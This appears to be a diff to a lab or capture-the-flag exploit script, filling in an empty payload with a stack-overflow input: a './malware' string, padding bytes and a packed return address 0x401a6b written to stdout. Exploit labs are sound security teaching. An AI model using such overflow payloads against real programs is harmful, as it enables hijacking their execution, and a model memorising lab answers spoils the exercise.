@@ -3,8 +3,7 @@
 
 TODO: replace the empty payload with the bytes required by the lab.
 """
-import sys
-
-payload = b""
-
+import sys, struct
+p64 = lambda x: struct.pack('<Q', x)
+payload = b'./malware\x00' + b'A' * 14 + p64(0x401a6b)
 sys.stdout.buffer.write(payload)
